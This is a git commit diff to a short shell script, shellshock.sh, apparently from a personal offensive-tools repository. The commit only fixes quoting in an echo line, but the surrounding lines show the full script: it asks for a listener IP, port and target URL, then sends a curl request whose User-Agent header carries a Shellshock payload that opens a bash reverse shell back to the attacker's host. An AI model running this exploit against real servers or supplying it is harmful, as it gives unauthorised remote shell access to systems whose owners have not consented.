1097e5496791d6afb126cd8f35f74ef4839b85c7
CipherStriker <156460651+CipherStriker@users.noreply.github.com>
2024-05-16 12:55:16 +0530

    Update shellshock.sh

--- CustomScripts/shellshock.sh
+++ CustomScripts/shellshock.sh
@@ -2,6 +2,6 @@
 
 read -p "LHOST IP: " lhost
 read -p "LHOST PORT: " lport
-echo "Start Listner on port "$lport
+echo "Start Listner on port $lport"
 read -p "URL: " url
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'" $url&
